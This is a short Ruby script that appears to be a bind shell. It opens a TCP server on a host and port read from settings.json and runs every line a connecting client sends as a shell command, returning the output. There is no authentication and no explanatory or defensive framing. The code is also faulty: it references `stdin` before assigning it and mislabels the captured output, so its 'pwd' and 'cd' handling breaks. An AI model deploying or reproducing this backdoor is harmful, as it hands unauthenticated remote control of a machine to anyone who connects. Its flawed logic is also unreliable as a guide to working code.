require 'socket'
require 'open3'
require 'json'

file = open('settings.json')
json_data = file.read
data = JSON.parse(json_data)

hostname = data['host']
port = data['port'].to_i

s = TCPServer.open(hostname, port)

loop do
  client = s.accept
  while line = client.gets
    if line.chop == 'exit'
      client.close
      exit
    else
      begin
        if stdin['pwd'] then 
          puts(Dir.pwd)
          client.puts(Dir.pwd)
        else
          stdin, stout, status = Open3.capture3(line.chop)
          client.puts(stdin)
          puts(stdin)
        end
      rescue
        if stdin['cd'] then
          Dir.chdir(stdin[3..stdin.length])
        else
          client.puts("command not found")
        end
      end
    end
  end
  client.close


end
